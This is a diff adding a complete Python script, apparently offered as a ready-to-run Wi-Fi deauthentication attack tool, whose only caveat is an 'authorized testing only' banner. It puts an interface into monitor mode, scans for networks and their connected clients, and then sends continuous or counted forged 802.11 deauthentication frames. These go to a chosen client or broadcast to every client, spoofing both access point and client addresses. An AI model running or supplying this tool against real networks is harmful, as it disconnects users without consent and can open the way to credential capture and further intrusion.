@@ -1,0 +1,458 @@
+#!/usr/bin/env python3
+"""
+Wi-Fi Deauthentication Tool - Educational / Authorized Testing Only
+Fixed & cleaned version - December 2025
+"""
+
+import os
+import sys
+import time
+import subprocess
+import threading
+import signal
+from datetime import datetime
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt
+import argparse
+import csv
+import netifaces
+
+# ==================== CONFIGURATION ====================
+LOG_FILE = "wifi_deauth_log.csv"
+DEFAULT_REASON = 7          # 7 = Class 3 frame received from nonassociated STA
+MAX_PPS = 50                # packets per second limit (per interface)
+SCAN_TIMEOUT = 12           # seconds for network scan
+CLIENT_SCAN_TIMEOUT = 8     # seconds for client scan
+
+# Global control
+running = True
+attack_threads = []
+selected_interface = None
+selected_network = None
+scan_results = []
+clients_list = []
+
+# ==================== Logging ====================
+class Logger:
+    def __init__(self, filename=LOG_FILE):
+        self.filename = filename
+        self._init_file()
+
+    def _init_file(self):
+        if not os.path.exists(self.filename):
+            with open(self.filename, 'w', newline='') as f:
+                writer = csv.writer(f)
+                writer.writerow([
+                    'Timestamp', 'Action', 'Interface', 'BSSID', 'ESSID',
+                    'Client_MAC', 'Channel', 'Reason', 'Packets', 'Status'
+                ])
+
+    def log(self, action, iface="", bssid="", essid="", client="", channel="",
+            reason="", packets="", status=""):
+        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        row = [ts, action, iface, bssid, essid, client, channel, reason, packets, status]
+        with open(self.filename, 'a', newline='') as f:
+            csv.writer(f).writerow(row)
+        print(f"[{ts}] {action:18} | {status}")
+
+logger = Logger()
+
+# ==================== Utility Functions ====================
+def check_root():
+    if os.geteuid() != 0:
+        print("This script requires root privileges!")
+        sys.exit(1)
+
+def get_wifi_interfaces():
+    interfaces = []
+    for iface in netifaces.interfaces():
+        if iface.startswith(('lo', 'docker', 'veth')):
+            continue
+        if os.path.exists(f'/sys/class/net/{iface}/wireless'):
+            interfaces.append(iface)
+    return interfaces
+
+def is_monitor_mode(iface):
+    try:
+        out = subprocess.check_output(['iwconfig', iface], stderr=subprocess.DEVNULL).decode()
+        return "Mode:Monitor" in out
+    except:
+        return False
+
+def set_monitor_mode(iface):
+    print(f"Setting {iface} → monitor mode...")
+
+    # Prefer airmon-ng if available
+    try:
+        subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)
+        result = subprocess.run(['airmon-ng', 'start', iface], capture_output=True, text=True, timeout=12)
+        for line in result.stdout.splitlines():
+            if 'monitor mode enabled on' in line.lower():
+                mon_iface = line.split('(')[1].split(')')[0].strip()
+                print(f"→ Monitor interface: {mon_iface}")
+                return mon_iface
+    except:
+        pass
+
+    # Manual fallback
+    try:
+        subprocess.run(['ip', 'link', 'set', iface, 'down'], check=True)
+        subprocess.run(['iw', iface, 'set', 'type', 'monitor'], check=True)
+        subprocess.run(['ip', 'link', 'set', iface, 'up'], check=True)
+        time.sleep(1.5)
+        if is_monitor_mode(iface):
+            print(f"Manual monitor mode success on {iface}")
+            return iface
+    except Exception as e:
+        print(f"Manual method failed: {e}")
+
+    print("All monitor mode methods failed.")
+    return None
+
+def restore_managed(iface):
+    print(f"Restoring {iface} → managed mode...")
+    try:
+        subprocess.run(['airmon-ng', 'stop', iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
+    except:
+        pass
+
+    try:
+        subprocess.run(['ip', 'link', 'set', iface, 'down'], check=True)
+        subprocess.run(['iw', iface, 'set', 'type', 'managed'], check=True)
+        subprocess.run(['ip', 'link', 'set', iface, 'up'], check=True)
+        time.sleep(1.5)
+        subprocess.run(['systemctl', 'restart', 'NetworkManager'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("Restore OK")
+        return True
+    except Exception as e:
+        print(f"Restore failed: {e}")
+        return False
+
+# ==================== Scanning ====================
+def scan_networks(iface):
+    print(f"\nScanning networks on {iface} ({SCAN_TIMEOUT}s)...")
+    networks = []
+    seen = set()
+
+    def pkt_handler(p):
+        if not p.haslayer(Dot11Beacon):
+            return
+        bssid = p[Dot11].addr2
+        if bssid in seen:
+            return
+        seen.add(bssid)
+
+        essid = "<hidden>"
+        channel = "?"
+        if p.haslayer(Dot11Elt):
+            elt = p[Dot11Elt]
+            while elt:
+                if elt.ID == 0 and elt.info:
+                    essid = elt.info.decode('utf-8', errors='ignore').strip()
+                if elt.ID == 3 and elt.info:
+                    try:
+                        channel = str(ord(elt.info))
+                    except:
+                        pass
+                elt = elt.payload
+
+        # Try extended channel info (better for 5GHz)
+        if p.haslayer(Dot11Elt) and channel == "?":
+            elt = p[Dot11Elt]
+            while elt:
+                if elt.ID == 61 and len(elt.info) >= 1:  # HT Operation
+                    try:
+                        channel = str(elt.info[0])
+                    except:
+                        pass
+                elt = elt.payload
+
+        networks.append({
+            'BSSID': bssid,
+            'ESSID': essid,
+            'Channel': channel,
+            'Interface': iface
+        })
+
+    try:
+        sniff(iface=iface, prn=pkt_handler, timeout=SCAN_TIMEOUT, store=0)
+    except Exception as e:
+        print(f"Scan error: {e}")
+
+    return sorted(networks, key=lambda x: x['ESSID'])
+
+def scan_clients(iface, bssid, channel):
+    print(f"Scanning clients for {bssid} (ch {channel})...")
+    clients = set()
+
+    def pkt_handler(p):
+        if not p.haslayer(Dot11):
+            return
+        if p.addr1 == bssid and p.addr2 != bssid:
+            clients.add(p.addr2)
+        if p.addr2 == bssid and p.addr1 != bssid:
+            clients.add(p.addr1)
+
+    try:
+        subprocess.run(['iwconfig', iface, 'channel', channel], check=True, timeout=3)
+        time.sleep(0.8)
+        sniff(iface=iface, prn=pkt_handler, timeout=CLIENT_SCAN_TIMEOUT, store=0)
+    except Exception as e:
+        print(f"Client scan error: {e}")
+
+    return [{'MAC': mac} for mac in sorted(clients) if mac.lower() != 'ff:ff:ff:ff:ff:ff']
+
+# ==================== Attack ====================
+def send_deauth(iface, target, ap, reason=DEFAULT_REASON, count=0, duration=0, pps=MAX_PPS):
+    global running
+
+    interval = 1.0 / pps if pps > 0 else 0.1
+
+    pkt_from_ap = RadioTap() / Dot11(
+        addr1=target, addr2=ap, addr3=ap, SC=0x4000
+    ) / Dot11Deauth(reason=reason)
+
+    pkt_from_client = RadioTap() / Dot11(
+        addr1=ap, addr2=target, addr3=ap, SC=0x4000
+    ) / Dot11Deauth(reason=reason)
+
+    sent = 0
+    start = time.time()
+
+    print(f"→ Sending deauth (reason {reason}) to {target} @ {pps} pps...")
+
+    try:
+        while running:
+            if duration > 0 and time.time() - start > duration:
+                break
+            if count > 0 and sent >= count:
+                break
+
+            sendp(pkt_from_ap, iface=iface, count=1, verbose=0)
+            sendp(pkt_from_client, iface=iface, count=1, verbose=0)
+            sent += 2
+
+            time.sleep(interval)
+
+        status = "Completed" if running else "Stopped"
+        logger.log("Deauth", iface, ap, "", target, "", reason, str(sent), status)
+        print(f"Deauth finished → {sent} packets sent")
+
+    except Exception as e:
+        logger.log("Deauth_ERROR", iface, ap, "", target, "", reason, str(sent), str(e))
+        print(f"Attack error: {e}")
+
+def deauth_thread(iface, target, ap, **kwargs):
+    t = threading.Thread(target=send_deauth, args=(iface, target, ap), kwargs=kwargs, daemon=True)
+    t.start()
+    attack_threads.append(t)
+    return t
+
+# ==================== Cleanup & Signal ====================
+def cleanup():
+    global running
+    running = False
+    print("\nStopping attacks & cleaning up...")
+
+    for t in attack_threads:
+        if t.is_alive():
+            t.join(timeout=2.0)
+
+    if selected_interface and is_monitor_mode(selected_interface):
+        restore_managed(selected_interface)
+
+    print("Cleanup finished.")
+
+def signal_handler(sig, frame):
+    print("\nCaught Ctrl+C")
+    cleanup()
+    sys.exit(130)
+
+signal.signal(signal.SIGINT, signal_handler)
+
+# ==================== UI Helpers ====================
+def print_table(title, headers, rows):
+    print(f"\n{title}")
+    print("-" * 90)
+    print(f"{'#':<3} {' '.join(f'{h:<18}' for h in headers)}")
+    print("-" * 90)
+    for i, row in enumerate(rows, 1):
+        print(f"{i:<3} {' '.join(f'{str(v)[:17]:<18}' for v in row)}")
+    print("-" * 90)
+
+# ==================== Main Menu ====================
+def main():
+    global selected_interface, selected_network, scan_results, clients_list
+
+    check_root()
+
+    print("\n" + "="*70)
+    print("Wi-Fi DEAUTHENTICATION TOOL  (fixed & cleaned - 2025)")
+    print("For authorized security testing only!")
+    print("="*70)
+
+    # Select interface
+    wifis = get_wifi_interfaces()
+    if not wifis:
+        print("No wireless interfaces found!")
+        return
+
+    print("\nAvailable Wi-Fi interfaces:")
+    for i, iface in enumerate(wifis, 1):
+        print(f"  {i}. {iface}{' (monitor)' if is_monitor_mode(iface) else ''}")
+
+    try:
+        idx = int(input("\nSelect interface → ")) - 1
+        if idx < 0 or idx >= len(wifis):
+            print("Invalid choice!")
+            return
+        iface = wifis[idx]
+    except:
+        print("Invalid input!")
+        return
+
+    # Set monitor mode if needed
+    if not is_monitor_mode(iface):
+        mon = set_monitor_mode(iface)
+        if mon:
+            selected_interface = mon
+        else:
+            print("Cannot continue without monitor mode.")
+            return
+    else:
+        selected_interface = iface
+        print(f"Using existing monitor interface: {iface}")
+
+    # Main loop
+    while True:
+        print("\n" + "="*60)
+        print("MENU")
+        print(" 1. Scan for networks")
+        print(" 2. Select network & scan clients")
+        print(" 3. Deauth one client")
+        print(" 4. Deauth broadcast (all clients)")
+        print(" 5. Show logs")
+        print(" 6. Restore & Exit")
+        print("="*60)
+
+        choice = input("→ ").strip()
+
+        if choice == '1':
+            scan_results = scan_networks(selected_interface)
+            if scan_results:
+                rows = [(n['BSSID'], n['Channel'], n['ESSID']) for n in scan_results]
+                print_table("Found networks:", ["BSSID", "Channel", "ESSID"], rows)
+            else:
+                print("No networks found during scan.")
+
+        elif choice == '2':
+            if not scan_results:
+                print("Scan first (option 1)!")
+                continue
+
+            rows = [(n['BSSID'], n['Channel'], n['ESSID']) for n in scan_results]
+            print_table("Networks:", ["BSSID", "Channel", "ESSID"], rows)
+
+            try:
+                idx = int(input("Select network number → ")) - 1
+                if idx < 0 or idx >= len(scan_results):
+                    print("Invalid!")
+                    continue
+                selected_network = scan_results[idx]
+            except:
+                print("Invalid input!")
+                continue
+
+            clients_list = scan_clients(
+                selected_interface,
+                selected_network['BSSID'],
+                selected_network['Channel']
+            )
+
+            if clients_list:
+                rows = [(c['MAC'],) for c in clients_list]
+                print_table("Connected clients:", ["MAC"], rows)
+            else:
+                print("No clients detected.")
+
+        elif choice in ('3', '4'):
+            if not selected_network:
+                print("First select network (option 2)!")
+                continue
+
+            target = "ff:ff:ff:ff:ff:ff" if choice == '4' else None
+
+            if choice == '3':
+                if not clients_list:
+                    print("No clients found yet.")
+                    continue
+                rows = [(c['MAC'],) for c in clients_list]
+                print_table("Clients:", ["MAC"], rows)
+                try:
+                    idx = int(input("Select client → ")) - 1
+                    if idx < 0 or idx >= len(clients_list):
+                        print("Invalid!")
+                        continue
+                    target = clients_list[idx]['MAC']
+                except:
+                    print("Invalid input!")
+                    continue
+
+            print("\nAttack settings:")
+            print("  Reason: 7 = Class3 from nonassoc   /   8 = Leaving")
+            reason = input("Reason [7] → ").strip() or "7"
+            try:
+                reason = int(reason)
+            except:
+                reason = DEFAULT_REASON
+
+            mode = input("Mode → (c)ount / (d)uration / (cont)inuous [cont] → ").strip().lower()
+            count = duration = 0
+
+            if mode.startswith('c'):
+                try:
+                    count = int(input("How many packets? → "))
+                except:
+                    print("Invalid → using continuous")
+            elif mode.startswith('d'):
+                try:
+                    duration = int(input("Duration (seconds)? → "))
+                except:
+                    print("Invalid → using continuous")
+            # else: continuous
+
+            pps = input(f"Packets/sec [max {MAX_PPS}] → ").strip()
+            try:
+                pps = min(int(pps), MAX_PPS) if pps else MAX_PPS
+            except:
+                pps = MAX_PPS
+
+            print("\n" + "!"*60)
+            print("STARTING DEAUTH ATTACK")
+            print("Press Ctrl+C to stop")
+            print("!"*60 + "\n")
+
+            if choice == '3':
+                deauth_thread(selected_interface, target, selected_network['BSSID'],
+                              reason=reason, count=count, duration=duration, pps=pps)
+            else:
+                deauth_thread(selected_interface, "ff:ff:ff:ff:ff:ff", selected_network['BSSID'],
+                              reason=reason, count=count, duration=duration, pps=pps)
+
+        elif choice == '5':
+            if os.path.exists(LOG_FILE):
+                with open(LOG_FILE) as f:
+                    print(f.read())
+            else:
+                print("No log entries yet.")
+
+        elif choice == '6':
+            print("\nExiting...")
+            cleanup()
+            return
+
+        else:
+            print("Invalid choice.")
+
+if __name__ == '__main__':
+    main()
